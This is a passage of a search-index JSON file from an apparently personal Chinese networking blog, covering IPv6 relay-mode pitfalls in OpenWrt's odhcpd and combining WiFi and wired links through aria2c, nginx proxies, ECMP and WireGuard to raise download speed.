\u5730\u5740\u8def\u7531\u8fc7\u6765\uff0c\u8fd9\u4e2a\u89e6\u53d1\u52a8\u4f5c\u5c31\u662f DHCP\uff09</p> <p>RA service relay\u6a21\u5f0f\uff1a</p> <p>Forward\u00a0RA\u00a0messages received on the designated master interface to downstream interfaces</p> <p>win\u4e0a\u6293\u5305\u53d1\u73b0.\u8def\u7531\u5668\u8fd4\u56de\u7684RA\u62a5\u6587\u4e2dflag\u8bbe\u7f6e\u4e86proxy\u3002</p> <p>tcpdump -tttt -n -i eth0 icmp6 -w eth0.pcap tcpdump -tttt -n -i eth1 icmp6 -w eth1.pcap</p> <p>wireshark filter <pre><code>ipv6.addr!=2001:da8:d800:611::1\n</code></pre></p>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#\u672a\u89e3\u4e4b\u8c1c\u7684\u89e3\u5f00","title":"\u672a\u89e3\u4e4b\u8c1c\u7684\u89e3\u5f00","text":"<p>odhcpd \u4e2d\u7ee7\u6a21\u5f0f\u539f\u7406\u3001\u5c40\u9650\u4ee5\u53ca\u89e3\u51b3\u65b9\u6848 | Silent Blog (icpz.dev) OpenWRT IPv6 \u4e2d\u7ee7\u6a21\u5f0f - Zero's Blog (sourceforge.io)</p>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#\u4e2d\u7ee7\u884c\u4e3a","title":"\u4e2d\u7ee7\u884c\u4e3a","text":"<p>RS, RA\u7684\u4e2d\u7ee7\u6211\u81ea\u5df1\u4e5f\u53d1\u73b0\u4e86\uff0c\u6bd4\u8f83\u597d\u7406\u89e3</p> <ol> <li>\u4ece slave interface \u6536\u5230 RS \u6d88\u606f\uff0codhcpd \u4f1a\u4fee\u6539\u5176\u6e90 MAC \u5730\u5740\u4e3a master interface \u518d\u5c06\u5176\u4ece master interface \u8f6c\u53d1\u51fa\u53bb\uff1b</li> <li>\u4ece master interface \u6536\u5230\u7684 RA \u6d88\u606f\uff0codhcpd \u4f1a\u4fee\u6539\u5176\u4e2d\u6e90 MAC \u5730\u5740\u4e3a slave interface \u518d\u5c06\u5176\u4ece slave interface \u8f6c\u53d1\u51fa\u53bb\uff1b</li> <li>\u4ece slave \u6536\u5230\u7684 RA \u4ee5\u53ca\u4ece master \u6536\u5230\u7684 RS \u6d88\u606f\u4f1a\u88ab\u5ffd\u7565\u3002</li> </ol> <p>NS\uff0cNA\u7684\u4e2d\u7ee7\u5219\u6bd4\u8f83trick</p> <p>\u5bf9\u4e8e NDP \u4e2d\u7ee7\u5219\u4e0d\u533a\u5206 master/slave \u8eab\u4efd\uff0c\u4ee5\u4e0b\u4ec5\u4ee5 M\uff0cS \u4e24\u4e2a interface \u505a\u4e3e\u4f8b\uff1a 1. \u4ece M \u6536\u5230 NS \u6d88\u606f\uff0codhcpd \u4f1a\u5728 S \u53d1\u9001 icmp-echo \u6d88\u606f\u6765\u8ba9\u5185\u6838\u5728 S interface \u89e6\u53d1\u76ee\u7684\u5730\u5740\u7684 NDP \u8fc7\u7a0b\uff0c\u82e5\u6210\u529f\u5728 S \u6240\u5728\u7684\u94fe\u8def\u53d1\u73b0\u4e86\u76ee\u7684\u5730\u5740\uff0c\u5219\u5728 M \u56de\u590d\u76f8\u5e94\u7684 NA \u6d88\u606f\uff0c\u53cd\u4e4b\u4ea6\u7136\uff1b 2. \u5728\u4e0a\u8ff0\u6b65\u9aa4\u4e2d\u6210\u529f\u5728 M/S \u94fe\u8def\u88ab\u53d1\u73b0\u7684\u8282\u70b9\u5730\u5740\u4f1a\u88ab\u52a0\u5165\u8def\u7531\u8868\uff0c\u4ee5\u65b9\u4fbf\u540e\u7eed\u901a\u4fe1\u7684\u8def\u7531\u7b56\u7565\u3002</p> <ol> <li>LAN \u4fa7\u5ba2\u6237\u7aef A \uff08<code>2001:da8:abc:def::A/64</code>\uff09\u53d1\u8d77\u4e86\u5bf9\u5168\u5c40\u8def\u7531\u5730\u5740\uff08\u5982 ipv6.google.com\uff09\u7684 echo-request \u8bf7\u6c42\uff0c\u8be5 IPv6 \u5206\u7ec4\u4f1a\u88ab\u6b63\u5e38\u8def\u7531\u5230 Google \u7684\u670d\u52a1\u5668\uff1b</li> <li>\u670d\u52a1\u5668 echo-reply \u7684\u5206\u7ec4\u5230\u8fbe WAN \u53e3\u7684\u4e0a\u6e38\uff0c\u6b64\u65f6\u4e0a\u6e38\u4f1a\u5728\u5404\u4e2a\u8282\u70b9\u7aef\u53e3\u5e7f\u64ad\u76ee\u6807\u662f A \u5730\u5740\u7684 NS \u6d88\u606f\uff0c\u5f53\u8def\u7531\u5668\u7684 WAN \u6536\u5230\u8be5 NS \u65f6\uff0c\u4f1a\u6309\u7167\u524d\u6587\u4e2d NDP \u4e2d\u7ee7\u7684\u884c\u4e3a\u8fdb\u884c\u4e2d\u7ee7\uff1b</li> <li>odhcpd \u6210\u529f\u8ba9\u5185\u6838\u5728 LAN \u4fa7\u53d1\u73b0\u4e86 A\uff0c\u4ece\u800c\u5728 WAN \u4fa7\u56de\u590d\u4e86 NA \u8bf7\u6c42\uff0c\u5e76\u5728\u8def\u7531\u8868\u6dfb\u52a0\u4e86 A \u5730\u5740\u5728 LAN \u4fa7\u7684\u8868\u9879\uff1b</li> <li>WAN \u53e3\u7684\u4e0a\u6e38\u6536\u5230\u4e86\u6765\u81ea odhcpd \u7684 NA \u6d88\u606f\u4ece\u800c\u66f4\u65b0\u4e86 A \u8282\u70b9\u7684\u90bb\u5c45\u4fe1\u606f\uff0c\u5e76\u5c06\u6765\u81ea\u670d\u52a1\u5668\u7684 echo-reply \u5206\u7ec4\u53d1\u9001\u5230 WAN \u53e3\uff1b</li> <li>WAN \u53e3\u6839\u636e\u6b65\u9aa4 3 \u4e2d\u5efa\u7acb\u7684\u8def\u7531\u8868\u9879\u5c06\u53d1\u5f80 A \u7684\u5206\u7ec4\u8def\u7531\u5230 LAN \u4fa7\u5e76\u4ea4\u4ed8\u3002</li> </ol> <p>\u73b0\u8c61 - win11 ping op1\uff0c\u53d1\u73b0\u6839\u672c\u6536\u4e0d\u5230echo request\uff0c\u4e5f\u5c31\u662fWAN\u4e0a\u6e38\u6839\u672c\u6ca1\u6709\u5bf9\u5176\u8f6c\u53d1\u3002\u8fd9\u91cc\u662f1\u53d1\u751f\u4e86\u95ee\u9898   - \u5176\u5b9e\u95ee\u9898\u5728\u4e8ewin11\u83b7\u5f97ip\u5730\u5740\u540e\uff0c\u4e0a\u6e38\u6ca1\u6536\u5230\u4efb\u4f55\u6d88\u606f\u3002   - \u4e0a\u6e38\u6709BRAS\uff0cipv4\u9700\u8981dhcp\u89e6\u53d1\uff0c\u624d\u4f1a\u8fdb\u884c\u8def\u7531\u3002ipv6\u770b\u6765\u4e5f\u6709\u7c7b\u4f3c\u884c\u4e3a\uff0c\u53ef\u80fd\u89e6\u53d1\u6761\u4ef6\u5c31\u662fNS\uff1f   - \u53d1\u73b0\u4e0a\u6e38\u597d\u50cf\u5728src ip\u5730\u5740\u6ca1\u6709\u89e6\u53d1\u8ba4\u8bc1\u524d\uff0c\u662f\u4e0d\u4f1a\u8fdb\u884c\u8f6c\u53d1\u7684\u3002\u4f46\u662f\u5982\u679c\u4ece\u5176\u5b83\u5730\u65b9ping\u4e00\u4e0b\u8be5ip\uff0c\u5219\u4e0a\u6e38\u786e\u5b9e\u4f1a\u5c1d\u8bd5\u8f6c\u53d1\u8be5\u5305\uff0c\u5e76\u5bf9WAN\u53d1\u9001NS\u3002     - \u4f46\u662f\u5e76\u4e0d\u662f\u5bf9\u6240\u6709ip\u90fd\u6709\u8fd9\u6837\u7684\u6548\u679c\uff0c\u6211\u542f\u7528fake pd\u540e\uff0cdhcp\u5206\u914d\u7684\u77ed\u7684\u5730\u5740\u5c31\u6ca1\u7528\u3002\u4e0a\u6e38\u6839\u672c\u4e0d\u8def\u7531\u8fd9\u4e2aip\u3002 - pve ping op1\uff0c\u53d1\u73b0op1\u6536\u5230\u4e86request\u4e5freply\u4e86\uff0c\u4f46\u662fpve\u6536\u4e0d\u5230reply\u3002   - \u8fd9\u662f\u7531\u4e8e2\uff0c\u4e0a\u6e38\u6ca1\u6709\u53d1NS\u800c\u662f\u76f4\u63a5\u5c06reply\u53d1\u9001\u7ed9\u4e86WAN\uff0c\u6ca1\u6709\u89e6\u53d1odhcpd\u7684NDP\u4e2d\u7ee7\u8fc7\u7a0b\uff0c\u56e0\u6b64op2\u4e0d\u77e5\u9053pve\u4f4d\u4e8eLAN\u3002\u800c\u6839\u636e\u73b0\u6709\u8def\u7531\u8868\u8fdb\u884c\u8f6c\u53d1\u65f6\uff0c\u4f1a\u4eceWAN\u53d1\u9001NS\u6765\u83b7\u5f97pve mac\u5730\u5740\uff0c\u56e0\u800c\u56e0\u6536\u4e0d\u5230NA\u800c\u8d85\u65f6\u3002   - \u5177\u4f53\u8fc7\u7a0b\u7c7b\u4f3c     1. \u76ee\u7684\u5730\u662f LAN \u4fa7\u5ba2\u6237\u7aef A \u7684 IPv6 \u5206\u7ec4\u76f4\u63a5\u5230\u8fbe WAN \u53e3\uff1b     2. \u8def\u7531\u5668\u5185\u6838\u6839\u636e\u73b0\u6709\u8def\u7531\u8868\u8fdb\u884c\u8f6c\u53d1\uff0c\u53d1\u73b0\u8be5\u5206\u7ec4\u5c5e\u4e8e WAN \u53e3\u7684 /64 \u5b50\u7f51\uff0c\u6240\u4ee5\u5728 WAN \u53e3\u53d1\u9001 NS \u5bfb\u627e A \u7684 MAC \u5730\u5740\uff1b</p> <p>\u89e3\u51b3 - \u5bf9\u4e8e\u4e0a\u6e38\u4e0dNS\uff0c\u76f4\u63a5\u8f6c\u53d1reply\u5230wan\uff0c\u8fd9\u79cd\u60c5\u51b5\u53ea\u9700\u8981\u8bbe\u7f6e\u8def\u7531\u8868\uff0c\u6dfb\u52a0prefix\u5230lan\u63a5\u53e3\u7684\u8def\u7531\u5373\u53ef - \u5bf9\u4e8e\u4e0a\u6e38\u4e0d\u89e6\u53d1\u8def\u7531\uff0c\u9700\u8981\u5176\u5b83\u8bbe\u5907ping\u540e\uff0c\u624d\u8def\u7531\u7684\u60c5\u51b5\u3002</p> <p>\u4e0a\u6e38\u5230\u5e95\u600e\u6837\u624d\u4f1a\u89e6\u53d1\u5bf9\u5305\u7684\u5904\u7406\u554a\uff0cwin\u7684\u4e34\u65f6ipv6\u5730\u5740\u53ef\u4ee5\uff08\u6bcf\u6b21\u91cd\u542f\u7f51\u5361\u90fd\u4f1a\u53d8\u5316\uff09\uff0c\u4f46\u662flxc\u5bb9\u5668\u7684slaac\u53cd\u800c\u4e0d\u884c\u4e86\uff1f\u4ee5\u4e0b\u65f6\u4e24\u4e2a\u8bbe\u5907\u7f51\u5361\u542f\u52a8\u65f6\uff0cwan\u53e3\u7684icmp6\u5305 win11\u7684 </p> <p>lxc\u7684 </p> <p>\u4e0d\u77e5\u9053\u4ec0\u4e48\u65f6\u5019\u597d\u7684\uff0c\u628aNDP proxy slave\u5173\u6389lxc\u7a81\u7136\u5c31\u76f4\u63a5\u80fd\u8bbf\u95ee\u5916\u7f51\u4e86</p>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#\u89e3\u51b3","title":"\u89e3\u51b3","text":"<p>\u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u4f9d\u8d56\u00a0<code>owipcalc</code>\u00a0\u5305\u6765\u8ba1\u7b97\u5b50\u7f51\u5730\u5740\uff1a\u00a0<code>opkg install owipcalc</code>\u00a0\u3002 \u6211\u4eec\u53ef\u4ee5\u624b\u52a8\u5728 WAN \u53e3\u83b7\u5f97 IPv6 \u5730\u5740\u540e\u6dfb\u52a0\u4e00\u6761\u8def\u7531\u8868\uff0c\u8ba9\u6574\u4e2a\u5b50\u7f51\u91cd\u5b9a\u5411\u5230 LAN \u53e3\uff0c\u8fd9\u4e2a\u64cd\u4f5c\u53ef\u4ee5\u901a\u8fc7 OpenWrt \u7684 hotplug \u673a\u5236\u6765\u8fdb\u884c\uff0c\u4fdd\u5b58\u4ee5\u4e0b\u811a\u672c\u653e\u5728\u00a0<code>/etc/hotplug.d/iface/80-reset-route6</code>\u00a0\u5e76\u91cd\u542f WAN \u63a5\u53e3\u5373\u53ef</p>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/","title":"L3 \u8d1f\u8f7d\u5747\u8861\u5b9e\u73b0\u7f51\u901f\u53e0\u52a0","text":"<ul> <li>\u516c\u53f8\u6709 wifi \u548c \u7f51\u7ebf\u63a5\u5165\u3002\u4f46\u662f\u6bcf\u6761\u94fe\u8def\u90fd\u4e25\u683c\u9650\u5236\u6210\u4e86 8 Mbps \u7684\u901f\u5ea6\u3002</li> <li>\u540c\u65f6\u8fde\u63a5 wifi \u548c \u7f51\u7ebf\uff0c\u4fee\u6539\u8def\u7531\u8868\uff0c\u8ba9\u4e0d\u540c\u76ee\u7684\u5730\u5740\u8d70\u4e0d\u540c\u94fe\u8def\uff0c\u518d\u7ed3\u5408 aria2c \u7684\u591a\u6e90\u5730\u5740\u4e0b\u8f7d\uff0c\u53ef\u4ee5\u5b9e\u73b0\u7f51\u901f\u53e0\u52a0\u3002\u793a\u4f8b\u547d\u4ee4\uff1a <pre><code>aria2c -c -x 1 -s 2 https://alist.yfycloud.site:4433/d/Guest/Aria2/grpc.tar.xz\\?sign\\=JzEpqFm02IlJUuYfCQY3RZdU-NxYVyMElvQShef8Wy0\\=:0  http://192.168.36.254:\n8000/grpc.tar.xz\n</code></pre><ul> <li>-s 2 \u8868\u793a\u6587\u4ef6\u88ab\u5206\u6210 2 \u4efd\u5e76\u884c\u4e0b\u8f7d\uff0c-x 1 \u8868\u793a\u6bcf\u4e2a host \u6700\u5927\u521b\u5efa 1 \u4e2a\u8fde\u63a5\u3002\u8fd9\u91cc\u6307\u5b9a\u4e86 2 \u4e2a\u6e90 url\uff0c\u56e0\u6b64\u610f\u601d\u5c31\u662f\u4ece\u6bcf\u4e2a\u6e90\u5404\u521b\u5efa 1 \u4e2a\u8fde\u63a5\u3002</li> <li>\u5176\u4e2d\u6e90 alist.yfycloud.site \u4e3a\u516c\u7f51\u5730\u5740\uff0c\u8d70\u4ee5\u592a\u7f51\u3002\u6e90 192.168.36.254 \u8d70 wg\uff08\u5e95\u5c42\u57fa\u4e8e wifi\uff09</li> </ul> </li> </ul> <p>\u4f46\u662f\u4e0a\u9762\u4f7f\u7528\u4e86\u4e24\u53f0\u670d\u52a1\u5668\u63d0\u4f9b\u76f8\u540c\u7684\u6587\u4ef6\uff0c\u7531\u4e8e\u6709\u4e24\u4e2a\u516c\u7f51\u5730\u5740\uff08\u4f7f\u7528 LAN \u5730\u5740\u7684\u94fe\u63a5\u5e95\u5c42 wg \u4ecd\u7136\u9700\u8981\u4e00\u4e2a\u516c\u7f51\u5730\u5740\uff09\uff0c\u56e0\u6b64\u5206\u6d41\u6bd4\u8f83\u7b80\u5355\u3002\u5982\u679c\u8981\u7f29\u51cf\u4e3a 1 \u53f0\u670d\u52a1\u5668\uff0c\u5c31\u5f97\u6709\u8ba9\u5373\u4f7f\u662f\u53ea\u6709\u4e00\u4e2a\u516c\u7f51\u5730\u5740\uff0c\u4e5f\u53ef\u4ee5\u8d70\u4e0d\u540c\u8def\u7531\u7684\u65b9\u6cd5\uff08\u5373\u5206\u522b\u4ece\u4ee5\u592a\u7f51\u548c wifi \u51fa\u53bb\uff09</p> <p>\u6211\u5f00\u59cb\u7684\u60f3\u6cd5\u662f\u672c\u5730\u4f7f\u7528\u4e00\u4e2a nginx \u53cd\u5411\u4ee3\u7406\u8fdc\u7a0b\u7684\u94fe\u63a5\uff0c\u4f7f\u5f97\u8bf7\u6c42\u4e0d\u540c\u672c\u5730\u5730\u5740 127.0.0.x bind \u5230\u4e0d\u540c\u51fa\u53e3\u51fa\u53bb\u3002nginx \u652f\u6301 <code>proxy_bind</code> \u53c2\u6570\uff0c\u652f\u6301\u7ed1\u5b9a\u5230\u4e0d\u540c\u6e90 ip \u5730\u5740\u3002\u4f46\u662f\u6ca1\u60f3\u5230 Windows \u7684\u8def\u7531\u975e\u5e38\u4e0d\u7075\u6d3b\uff0c\u65e0\u6cd5\u5b9e\u73b0\u6e90\u5730\u5740\u7684\u8def\u7531<sup>1</sup></p> <p>\u540e\u9762\u6211\u5229\u7528\u4e00\u4e2a\u7b80\u5355\u7684\u5343\u5146\u8def\u7531\u5668\uff08xiaomi 4A gigabit version\uff09\u5c06\u591a\u53f0\u8bbe\u5907\u8fde\u63a5\u8d77\u6765\uff0c\u5e76\u5728\u6bcf\u53f0\u8bbe\u5907\u4e0a\u5f00\u542f nginx \u53cd\u4ee3\uff0c\u5b9e\u73b0\u4e86\u53ea\u6709\u4e00\u4e2a\u516c\u7f51\u5730\u5740\u7684\u60c5\u51b5\u4e0b\uff0c\u5bf9\u540c\u4e00\u4e2a\u670d\u52a1\u5668\u7684\u7f51\u901f\u53e0\u52a0\u6548\u679c\u3002</p> <p>nginx \u7684\u65b9\u6cd5\u867d\u7136\u6709\u6548\uff0c\u4f46\u662f\u6574\u4e2a setup \u6709\u70b9\u590d\u6742\uff08windows \u9700\u8981\u914d\u7f6e nginx\uff0c\u8bbe\u7f6e\u8def\u7531\u8868\uff09\uff0c\u5e76\u4e14\u53ea\u80fd\u9488\u5bf9\u4e00\u4e2a\u76ee\u7684\u5730\u5740\u53e0\u52a0\u7f51\u901f\u3002\u8bbf\u95ee\u7f51\u9875\u5176\u5b83\u5185\u5bb9\u5c31\u65e0\u6cd5\u52a0\u901f\u4e86\u3002</p> <p>\u4e4b\u540e\u53c8\u53bb\u4e86\u89e3\u4e86 ECMP \u6280\u672f\uff0c\u5176\u4e2d per flow \u548c per packet \u5206\u6d41\u7684\u60f3\u6cd5\u770b\u4e0a\u53bb\u786e\u5b9e\u5f88\u7f8e\u597d\u3002\u5982\u679c\u53ef\u4ee5\u5b9e\u73b0\u7684\u8bdd\uff0c\u53ef\u4ee5\u771f\u6b63\u5b9e\u73b0\u9488\u5bf9\u4efb\u610f\u534f\u8bae\u7684\u7f51\u901f\u53e0\u52a0\u3002\uff08\u5355\u8fde\u63a5\u5728 per flow \u60c5\u51b5\u4e0b\u8fd8\u65e0\u6cd5\u63d0\u5347\u901f\u5ea6\uff0c\u4f46\u662f\u80fd\u591f\u5bf9\u4e0d\u540c\u5355\u8fde\u63a5\u8d1f\u8f7d\u5747\u8861\u4e5f\u8db3\u591f\u4e86\uff09</p> <p>\u5404\u65b9\u6848\u603b\u7ed3</p> <ul> <li>\u5355\u673a\u5668 wifi \u6709\u7ebf\u53e0\u52a0<ul> <li>\u65b9\u6cd5\uff1aaria2c \u6307\u5b9a\u591a\u4e2a\u6e90\u5730\u5740\uff0c\u4e0d\u540c\u5730\u5740\u4f7f\u7528\u4e0d\u540c\u8def\u7531\u3002</li> <li>\u4f18\u70b9\uff1a\u7b80\u5355\uff0c\u53ea\u9700\u8981\u4f7f\u7528 aria2c</li> <li>\u7f3a\u70b9\uff1a<ul> <li>\u9700\u8981\u6709\u591a\u4e2a\u516c\u7f51 ip\uff0c\u5426\u5219\u65e0\u6cd5\u6839\u636e\u76ee\u7684\u5730\u5740\u8def\u7531</li> <li>\u51e0\u4e2a\u94fe\u8def\u5c31\u9700\u8981\u51e0\u4e2a\u516c\u7f51 ip \uff08windows \u4e0d\u652f\u6301\u6e90\u5730\u5740\u8def\u7531\u5bfc\u81f4\u7684\uff09</li> </ul> </li> </ul> </li> <li>\u591a\u673a\u5668\u4f7f\u7528 nginx \u53cd\u4ee3<ul> <li>\u65b9\u6cd5\uff1a\u5bf9\u4e0a\u9762\u65b9\u6cd5\u7684\u6269\u5c55\uff0c\u6bcf\u53f0\u673a\u5668\u4f7f\u7528 nginx \u53cd\u4ee3\uff0c\u7c7b\u4f3c\u4e8e CDN \u8282\u70b9\u3002\u53e0\u52a0\u6240\u6709\u673a\u5668\u7684\u94fe\u8def</li> <li>\u4f18\u70b9<ul> <li>\u63d0\u5347\u4e86\u6269\u5c55\u6027\uff0c\u4e0d\u540c\u673a\u5668\u53ef\u4ee5\u4f7f\u7528\u76f8\u540c\u7684\u516c\u7f51 ip \u53cd\u4ee3</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u8bbe\u7f6e\u76f8\u5bf9\u590d\u6742</li> <li>\u53ea\u80fd\u4ee3\u7406 HTTP(S)</li> <li>\u53ea\u80fd\u5bf9\u8bbe\u7f6e\u7684\u5355\u4e2a\u516c\u7f51 ip \u53e0\u52a0\u94fe\u8def\uff0c\u6ca1\u8bbe\u7f6e\u7684 ip \u4ecd\u7136\u53ea\u80fd\u4f7f\u7528\u4e00\u4e2a\u94fe\u8def</li> </ul> </li> </ul> </li> <li>ECMP \u8d1f\u8f7d\u5747\u8861<ul> <li>\u65b9\u6cd5\uff1a\u5229\u7528 linux \u7684\u7b49\u6548\u591a\u5f84\u8def\u7531\uff0c\u5728\u8def\u7531\u5668\u4e0a\u5c31\u6d41\u91cf\u8d1f\u8f7d\u5747\u8861\u5230\u5404\u8282\u70b9\u51fa\u53bb</li> <li>\u4f18\u70b9<ul> <li>\u8bbe\u7f6e\u597d\u540e\uff0c\u5bf9\u6240\u6709\u6d41\u91cf\u90fd\u53ef\u4ee5\u8d1f\u8f7d\u5747\u8861\u5230\u4e0d\u540c\u94fe\u8def\u3002\u591a\u7ebf\u7a0b\u4e0b\u8f7d\u5c31\u53ef\u4ee5\u53e0\u52a0\u7f51\u901f\u3002</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>windows \u5783\u573e\u7684\u7f51\u7edc\u80fd\u529b\uff0c\u65e0\u6cd5 masqerade \u5bfc\u81f4\u65b9\u6848\u4e00\u5ea6\u4e0d\u53ef\u884c\uff08\u56e0\u4e3a\u53ea\u6709\u4e00\u4e2a\u7f51\u6bb5\uff0c\u6700\u540e\u56de\u6765\u7684\u6d41\u91cf\u5fc5\u7136\u8fd8\u662f\u5f97\u8d70\u4e00\u4e2a\u94fe\u8def\uff09</li> <li>\u5229\u7528 wg \u5728 openwrt \u8def\u7531\u5668\u548c windows \u95f4\u521b\u5efa\u989d\u5916\u7684\u5c40\u57df\u7f51\u6bb5\uff0c\u5c06 SRC NAT \u8f6c\u79fb\u5230 openwrt \u4e0a\uff0c\u89c4\u907f\u4e86 windows \u7684\u9650\u5236\u3002</li> <li>ECMP \u7684\u4e0d\u8db3<ul> <li>\u7b2c\u4e00\u4e2a\u95ee\u9898\u662f\u4e0d\u77e5\u9053\u600e\u4e48\u914d\u7f6e ECMP \u68c0\u6d4b\u5931\u6548\u7684\u94fe\u8def\u3002 wg \u65ad\u5f00\u8fde\u63a5\u540e\uff0cECMP \u5e76\u4e0d\u4f1a\u5220\u9664\u6389\u574f\u6389\u7684 nexthop\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u603b\u662f\u5bfc\u81f4\u7f51\u7edc\u4e0d\u53ef\u7528\uff08\u867d\u7136\u5176\u5b83 nexthop \u662f\u53ef\u7528\u7684\uff09</li> <li>\u7b2c\u4e8c\u4e2a\u95ee\u9898\u662f\u94fe\u8def\u5229\u7528\u7387\u4f4e\uff0c\u56e0\u4e3a\u662f per-flow \u8fdb\u884c\u8d1f\u8f7d\u5747\u8861\u3002\u8ba1\u7b97 L4 hash \u540e\uff0c\u6bcf\u4e2a\u8fde\u63a5\u7b49\u53ef\u80fd\u5206\u914d\u5230\u6bcf\u4e2a\u94fe\u8def\uff0c\u5e76\u4e0d\u4fdd\u8bc1\u4e0d\u4f7f\u7528\u76f8\u540c\u94fe\u8def\u3002\u800c\u7b80\u5355\u7684\u6570\u5b66\u8ba1\u7b97\u6211\u4eec\u53ef\u4ee5\u5f97\u5230 3 \u4e2a\u94fe\u8def\uff0c3 \u4e2a\u8fde\u63a5\u65f6\uff0c\u4f7f\u7528\u5168\u90e8\u94fe\u8def\u7684\u6982\u7387\u4ec5\u4e3a 2/9\uff0c4 \u4e2a\u8fde\u63a5\u65f6\u4ec5\u4e3a 9/16\u3002\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48 iperf3 -P 3 \u6bcf\u6b21\u7ed3\u679c\u53ef\u80fd\u4e0d\u4e00\u6837\u3002n \u4e2a \u94fe\u8def n \u4e2a\u8fde\u63a5\u60c5\u51b5\u4e0b\uff0c\u5229\u7528\u7387\u968f\u7740 n \u589e\u5927\uff0c\u4e0b\u964d\u5230\u6781\u9650\u503c \\(1 - 1/e \\approx 0.63\\)</li> </ul> </li> <li>ECMP \u8282\u70b9\u4f5c\u4e3a\u4e0b\u8f7d\u673a\u5668\u65f6\uff0c\u53ea\u80fd\u4f7f\u7528\u672c\u5730\u94fe\u8def\u3002<ul> <li>\u5982\u679c\u8def\u7531\u5668\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u53cd\u4ee3\u8282\u70b9\u5c31\u53ef\u4ee5\u89e3\u51b3\uff0c\u53ef\u60dc\u6211\u7684 mi4a \u53ea\u6709 16M \u7684 flash\uff0c\u5e94\u8be5\u88c5\u4e0d\u4e0b\uff08TODO\uff1a\u53ef\u4ee5\u8bd5\u8bd5\u81ea\u5df1\u7f16\u8bd1\u955c\u50cf\uff09</li> </ul> </li> </ul> </li> </ul> </li> </ul> <p>\u4e0b\u8f7d windows11 \u955c\u50cf\uff0c\u4ece\u4e00\u5c0f\u65f6\u4e8c\u5341\u5206\u949f\uff0c\u4e0b\u964d\u5230\u4e8c\u5341\u5206\u949f </p> <p>\u5229\u7528 mi4a + \u4e24\u53f0 windows \u5171 3 \u4e2a\u8def\u5f84\u8fdb\u884c ECMP\uff0c\u624b\u673a\u64ad\u653e B \u7ad9 4K \u89c6\u9891\u65f6\u7684\u6548\u679c\uff0cCPU \u6709 %30-40 \u7684\u5360\u7528\u3002 </p>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#\u65b9\u6848\u4e00-\u6bcf\u53f0\u673a\u5668-nginx-\u53cd\u4ee3\u4f5c\u4e3a-cdn-\u8282\u70b9","title":"\u65b9\u6848\u4e00: \u6bcf\u53f0\u673a\u5668 nginx \u53cd\u4ee3\uff0c\u4f5c\u4e3a CDN \u8282\u70b9","text":"<p>\u95ee\u9898\u8003\u8651\u7684\u662f\u5355\u53f0\u673a\u5668\u4e0a\u5982\u4f55\u590d\u7528\u591a\u4e2a\u94fe\u8def\uff0c\u4f46\u662f\u95ee\u9898\u53ef\u4ee5\u63a8\u5e7f\u5230\u6709\u591a\u53f0\u673a\u5668\uff0c\u590d\u7528\u6240\u6709\u8282\u70b9\u94fe\u8def\u7684\u60c5\u51b5\u3002</p> <p>\u6b64\u65f6\u5df2\u7ecf\u589e\u8bbe\u4e86\u4e00\u53f0\u8def\u7531\u5668\uff0c\u5237\u4e86 openwrt\uff0c\u5404\u8282\u70b9\u901a\u8fc7\u4ee5\u592a\u7f51\u8fde\u63a5\u8def\u7531\u5668\uff0c\u56e0\u6b64\u6bcf\u53f0\u673a\u5668\u5269\u4f59\u4e00\u4e2a wifi \u94fe\u8def\u7528\u4e8e\u8fde\u63a5\u5916\u7f51\u3002</p> <p>\u4e3a\u4e86\u5229\u7528\u6bcf\u53f0\u673a\u5668\u7684\u65e0\u7ebf\u94fe\u8def\u3002\u5f53\u4e00\u4e2a\u8282\u70b9\u4e0b\u8f7d\u65f6\uff0c\u5fc5\u7136\u8981\u5c06\u6d41\u91cf\u8def\u7531\u5230\u6bcf\u53f0\u673a\u5668\uff0c\u5e76\u4e14\u4ece\u65e0\u7ebf\u94fe\u8def\u51fa\u53bb\u3002</p>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#wg-\u914d\u7f6e","title":"wg \u914d\u7f6e","text":"<p>\u4e3a\u4e86\u4f7f\u6bcf\u53f0\u673a\u5668\u7684\u65e0\u7ebf\u94fe\u8def\u80fd\u591f\u5b9e\u9645\u4e0a\u7f51\uff0c\u9700\u8981\u4f7f\u7528 wg\uff08\u5229\u7528 wifi UDP 